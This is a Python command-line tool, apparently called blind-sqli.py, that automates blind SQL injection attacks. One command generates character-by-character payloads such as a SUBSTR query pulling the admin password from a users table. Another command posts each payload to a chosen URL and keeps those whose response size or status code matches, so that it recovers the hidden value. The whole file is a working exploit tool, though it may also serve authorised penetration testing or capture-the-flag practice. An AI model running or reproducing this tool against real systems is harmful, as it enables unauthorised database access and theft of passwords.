import requests
import click
from colorama import Fore
import re
from time import sleep
import json

kaonashi_art = f"""{Fore.MAGENTA}
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⣀⣀⣤⣤⣄⣀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⢀⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣷⡀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⢠⣿⠏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠹⣿⡄⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⣾⡟⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⢹⣿⡄⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⢰⣿⠃⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣻⡇⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⣼⣿⣧⣤⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⡇⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⣿⠟⠉⠉⠉⠛⢿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠙⠇⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⣿⣦⣀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡤⢀⣀⡠⣴⡇⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣉⣁⣁⣉⣿⣿⣿⣿⣿⣿⣿⣿⣧⣄⣀⣤⣽⡇⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⡏⠁⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠈⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠘⣿⣧⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⠁⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣰⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣦⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣾⣿⠇⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⠿⠿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⣀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⡿⠿⠿⠿⠿⢿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿
⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣷⣶⣦⣴⣶⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿
⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿
⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿
⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿
{Fore.RESET}"""

char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.;/|{}()_[]@#$%^*<>?"
matched_chars = ""
matched_line = []

def gen_list(payload, output, length):
      input_str = payload
      pattern = r'1'
      match = re.search(pattern, input_str)
      position = 1
      number = int(length)

      if match:         
         try:
            while number > 0:
               for char in char_set:
                  payload_final = re.sub(pattern, f"{str(position)}", input_str, 1)
                  payload_final += f"='{char}' --"
                  if output:
                     try:
                        with open(output, "a") as f:
                           f.write(f"{payload_final}\n")
                     except Exception as e:
                        print(f"{Fore.RED}[-] An error occured while writing to file: {e}{Fore.RESET}")
                        return 1
                  else:
                     print(payload_final)

               position += 1
               number -= 1
         except Exception as e:
            print(f"{Fore.RED}[-] An error occured: {e}{Fore.RESET}")
            return 1
      else:
         print(f"""{Fore.RED}[-] Error. The input string does not seems to be a Blind SQLi query.\n 
{Fore.LIGHTCYAN_EX}[!] The query should only be in the following format:
{Fore.YELLOW}`hello' OR (SELECT SUBSTR(password, 1, 1) FROM users WHERE username='admin')`\n
{Fore.LIGHTCYAN_EX}[!] The script will generate a payload list by adding `='{{char}}' -- ` at the end.\n{Fore.RESET}""")
         return 1
      
def process_match(response, expected_value, strip, line, data_final, is_size_check=True):
   if is_size_check:
      value = int(response.headers["Content-Length"])
      message = f"{Fore.GREEN}\nThe content returned with payload:\n{Fore.YELLOW}`{data_final}`{Fore.GREEN}\nmatches the expected response size of {expected_value}.\n{Fore.RESET}"
      check_val = value == expected_value
   else:
      value = response.status_code
      message = f"{Fore.GREEN}\nThe response returned with payload:\n{Fore.YELLOW}`{data_final}`{Fore.GREEN}\nmatches the expected status code of {expected_value}.\n{Fore.RESET}"
      check_val = value == expected_value

   if check_val:
      print(f"{Fore.GREEN}[+] Success! {message}")
      if strip:
         chars = line.split("=", 2)[2]
         matched = chars.strip()
         global matched_chars
         matched_chars += matched.strip("-' ")
      else:
         global matched_line
         matched_line.append(line)



def post_req(data, payload, headers, filter_code, filter_size, url, strip):
   if data and payload and url:
      if filter_code or filter_size:
         d = str(data)
         pattern = r"#1"
         match = re.search(pattern, d)

         if match:
            try:
               with open(payload, "r") as f:
                  for line in f.readlines():
                     try:
                        data_final = re.sub(pattern, line.strip(), d, 1)
                        data_final = json.loads(data_final)
                        if headers:
                           try:
                              h = json.loads(headers)
                              r = requests.post(url=url, data=data_final, headers=h)
                           except ValueError as e:
                              print(f"{Fore.RED}[-] An error occured while parsing headers. {e}\nMake sure the header is a JSON String.{Fore.RESET}")
                              exit(1)
                           except Exception as e:
                              print(f"{Fore.RED}[-] An error occured while parsing headers. {e}{Fore.RESET}")
                              exit(1)
                        else:
                           r = requests.post(url=url, data=data_final)
                        
                        if filter_size:
                              fs = int(filter_size)
                              process_match(r, fs, strip, line, data_final, is_size_check=True)
                        if filter_code:
                              fc = int(filter_code)
                              process_match(r, fc, strip, line, data_final, is_size_check=False)
                     except Exception as e:
                        print(f"{Fore.RED}[-] An error occured while parsing data. {e}\nMake sure the data is a JSON String.{Fore.RESET}")
                        exit(1)
            except FileNotFoundError as e:
               print(f"{Fore.RED}[-] File {payload} not found. {e}{Fore.RESET}")
               exit(1)
         else:
            print(f"{Fore.RED}[-] Error. Could not find the payload position in {Fore.YELLOW}`{d}`{Fore.RESET}\n{Fore.RED}Please enter the string \"#1\" at the position where you want to insert the payload.\ne.g. '{{\"username\":\"#1\",\"password\":\"password\"}}'{Fore.RESET}")
            exit(1)

         if (matched_chars) and (strip == True):
            print(f"{Fore.GREEN}[+] Matched characters from the payload:{Fore.RESET}")
            print(f"{Fore.MAGENTA}{matched_chars}{Fore.RESET}")
         elif (matched_line) and (strip == False):
            print(f"{Fore.GREEN}[+] Matched characters from the payload:{Fore.RESET}")
            for lines in matched_line:
               print(f"{Fore.MAGENTA}{lines}{Fore.RESET}")
         else:
            print(f"{Fore.RED}[-] Could not find a working payload.{Fore.RESET}")

      else:
         print(f"{Fore.RED}[-] Error. Either the response size or response status code to filter is required. Try again with -fc or -fs option.{Fore.RESET}")
         exit(1)
   else:
      print(f"{Fore.RED}[-] Error. Not enough arguments. Try with blind-sqli.py exploit --help to learn more.{Fore.RESET}")
      exit(1)
         

@click.group()
@click.option('--hush', is_flag=True, help="Suppress ASCII art printing.")
def main(hush):
   if not hush:
      print(kaonashi_art)
   else:
      print(f"{Fore.MAGENTA}[/] ASCII art printing suppressed.\n{Fore.RESET}")


@click.command()
@click.option('-p', '--payload', help="The payload string to iterate over. Required.")
@click.option('-o', '--output', help="File path to write contents in. Optional.", default=None)
@click.option('-l', '--length', help="Number of times to repeat the payload, e.g. if length is 10, the script will iterate over all characters 10 times. Default 1.", default=1)
def genlist(payload, output, length):
   if payload:
      try:
         if output:
            print(f"{Fore.LIGHTBLACK_EX}[\] Running genlist command...\n{Fore.RESET}")
            val = gen_list(payload, output, length)
            if val != 1:
               print(f"{Fore.GREEN}[+] Success! Payload list created at `{output}`.{Fore.RESET}")
         else:
            print(f"{Fore.LIGHTBLACK_EX}[\] Running genlist command...\n{Fore.RESET}")
            print(f"{Fore.BLUE}[!] No output file specified. Printing to stdout. This might mess up your terminal. Try outputting to a file with -o option.\n{Fore.RESET}")
            sleep(1)
            output = None
            val = gen_list(payload, output, length)
      except Exception as e:
         print(f"{Fore.RED}[-] An error occured. {e}{Fore.RESET}")
      except KeyboardInterrupt:
         print(f"{Fore.YELLOW}[!] User raised KeyboardInterrupt. Exiting...{Fore.RESET}")
   elif not payload:
      print(f"{Fore.RED}[-] Error. The payload to iterate over is required. Try again with -p option or try `python blind-sqli.py --help` for more info.{Fore.RESET}")
   else:
      print(f"{Fore.RED}[-] Something went wrong. See usage info with `python blind-sqli.py --help`.")


@click.command()
@click.option('-u', '--url', help="The URL to send POST requests. Required.")
@click.option('-d', '--data', help="Enter a JSON string for the POST data. Format: {\"key\":\"value\"}. Insert \"#1\" at the position where payload will be inserted. Required")
@click.option('-p', '--payload', help="File path for the payload wordlist. Required.")
@click.option('-fc', '--filter-code', help="Filter according to status codes. Required", type=int)
@click.option('-fs', '--filter-size', help="Filter according to response size. Required.", type=int)
@click.option('-h', '--headers', help="Enter a JSON String for custom headers. Format: {\"key\":\"value\"}. Optional.")
@click.option('-s', '--strip', help="The script will attempt to strip unwanted characters from the matched payload. Use with caution. Default False.", is_flag=True)
def exploit(data, payload, filter_code, filter_size, headers, url, strip):
   print(f"{Fore.LIGHTBLACK_EX}[\] Running exploit command...\n{Fore.RESET}")
   if strip:
      post_req(data, payload, headers, filter_code, filter_size, url, strip)
   else:
      strip = False
      post_req(data, payload, headers, filter_code, filter_size, url, strip)


main.add_command(genlist)
main.add_command(exploit)


if __name__=="__main__":
   main()
